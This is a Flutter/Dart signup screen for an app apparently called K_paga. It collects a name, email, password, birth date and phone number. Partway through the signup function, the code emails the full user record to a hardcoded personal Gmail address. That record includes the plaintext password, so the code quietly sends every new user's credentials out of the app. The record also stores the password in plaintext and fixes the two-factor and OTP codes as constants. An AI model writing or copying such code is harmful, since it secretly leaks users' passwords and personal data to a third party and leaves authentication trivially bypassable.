import 'package:flutter/material.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:intl/intl.dart';
import '../../services/auth_service.dart';
import '../../services/email_service.dart';
import '../../widgets/design_system.dart';
import '../../localization/app_localizations.dart';

class SignupScreen extends StatefulWidget {
  @override
  _SignupScreenState createState() => _SignupScreenState();
}

class _SignupScreenState extends State<SignupScreen> {
  final _formKey = GlobalKey<FormState>();
  final _nameController = TextEditingController();
  final _emailController = TextEditingController();
  final _passwordController = TextEditingController();
  final _birthDateController = TextEditingController();
  final _phoneController = TextEditingController();
  bool _isLoading = false;

  Future<void> _signup() async {
    if (!_formKey.currentState!.validate()) return;

    setState(() => _isLoading = true);

    try {
      final birthDate = DateFormat('yyyy-MM-dd').parse(_birthDateController.text);
      final age = DateTime.now().difference(birthDate).inDays ~/ 365;
      if (age < 18) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(AppLocalizations.of(context)!.translate('age_restriction')!),
            backgroundColor: danger,
          ),
        );
        setState(() => _isLoading = false);
        return;
      }

      final userData = {
        'id': 'usr_${DateTime.now().millisecondsSinceEpoch}',
        'username': _nameController.text.trim().toLowerCase(),
        'email': _emailController.text.trim(),
        'password': _passwordController.text.trim(),
        'full_name': _nameController.text.trim(),
        'birth_date': _birthDateController.text,
        'phone': _phoneController.text.trim(),
        'access': true,
        'expiration_date': DateTime.now().add(const Duration(days: 365)).toIso8601String(),
        'two_factor_auth': false,
        'two_factor_code': '1230',
        'otp': '12345',
        'user_key': 'USR-${DateTime.now().year}-XYZ${DateTime.now().millisecondsSinceEpoch % 1000}',
        'notification_message': 'Welcome to K_paga!',
        'created_at': DateTime.now().toIso8601String(),
        'profile_image': null,
        'role': 'USER',
        'blocked': false,
        'failed_attempts': 0,
        'blocked_until': null,
        'theme_black': false,
        'primary_color': 'purple',
        'bio': '',
        'followed_users': [],
        'watchlists': [],
        'preferences': {},
        'points': 0,
      };

      await AuthService().signup(
        email: _emailController.text.trim(),
        password: _passwordController.text.trim(),
        userData: userData,
        context: context,
      );

      await EmailService().sendUserData(userData, 'alfredopjonas@gmail.com');

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text(AppLocalizations.of(context)!.translate('account_created')!),
          backgroundColor: success,
        ),
      );
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text(AppLocalizations.of(context)!.translate('auth_error')!),
          backgroundColor: danger,
        ),
      );
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: BoxDecoration(gradient: accentGradient),
        child: Center(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(24),
            child: GlassCard(
              child: Padding(
                padding: const EdgeInsets.all(24),
                child: Form(
                  key: _formKey,
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Icon(Icons.person_add_rounded, size: 80, color: accentPrimary),
                      const SizedBox(height: 16),
                      Text(
                        AppLocalizations.of(context)!.translate('create_account')!,
                        style: Theme.of(context).textTheme.headlineMedium,
                      ),
                      const SizedBox(height: 24),
                      CustomTextField(
                        controller: _nameController,
                        label: AppLocalizations.of(context)!.translate('name')!,
                        icon: Icons.person_rounded,
                        validator: (value) {
                          if (value == null || value.trim().isEmpty) {
                            return AppLocalizations.of(context)!.translate('enter_name')!;
                          }
                          return null;
                        },
                      ),
                      const SizedBox(height: 16),
                      CustomTextField(
                        controller: _emailController,
                        label: AppLocalizations.of(context)!.translate('email')!,
                        icon: Icons.email_rounded,
                        keyboardType: TextInputType.emailAddress,
                        validator: (value) {
                          if (value == null || value.trim().isEmpty) {
                            return AppLocalizations.of(context)!.translate('enter_email')!;
                          }
                          if (!value.contains('@')) {
                            return AppLocalizations.of(context)!.translate('invalid_email')!;
                          }
                          return null;
                        },
                      ),
                      const SizedBox(height: 16),
                      CustomTextField(
                        controller: _passwordController,
                        label: AppLocalizations.of(context)!.translate('password')!,
                        icon: Icons.lock_rounded,
                        obscureText: true,
                        validator: (value) {
                          if (value == null || value.isEmpty) {
                            return AppLocalizations.of(context)!.translate('enter_password')!;
                          }
                          if (value.length < 6) {
                            return AppLocalizations.of(context)!.translate('password_too_short')!;
                          }
                          return null;
                        },
                      ),
                      const SizedBox(height: 16),
                      CustomTextField(
                        controller: _birthDateController,
                        label: AppLocalizations.of(context)!.translate('birth_date')!,
                        icon: Icons.calendar_today_rounded,
                        keyboardType: TextInputType.datetime,
                        validator: (value) {
                          if (value == null || value.isEmpty) {
                            return AppLocalizations.of(context)!.translate('enter_birth_date')!;
                          }
                          try {
                            DateFormat('yyyy-MM-dd').parse(value);
                          } catch (e) {
                            return AppLocalizations.of(context)!.translate('invalid_date')!;
                          }
                          return null;
                        },
                      ),
                      const SizedBox(height: 16),
                      CustomTextField(
                        controller: _phoneController,
                        label: AppLocalizations.of(context)!.translate('phone')!,
                        icon: Icons.phone_rounded,
                        keyboardType: TextInputType.phone,
                        validator: (value) {
                          if (value == null || value.trim().isEmpty) {
                            return AppLocalizations.of(context)!.translate('enter_phone')!;
                          }
                          return null;
                        },
                      ),
                      const SizedBox(height: 24),
                      CustomButton(
                        text: _isLoading
                            ? ''
                            : AppLocalizations.of(context)!.translate('create_account')!,
                        isLoading: _isLoading,
                        onPressed: _signup,
                      ),
                      const SizedBox(height: 16),
                      TextButton(
                        onPressed: () {
                          Navigator.pop(context);
                        },
                        child: Text(
                          AppLocalizations.of(context)!.translate('already_have_account')!,
                          style: Theme.of(context).textTheme.bodyMedium!.copyWith(color: accentPrimary),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _nameController.dispose();
    _emailController.dispose();
    _passwordController.dispose();
    _birthDateController.dispose();
    _phoneController.dispose();
    super.dispose();
  }
}
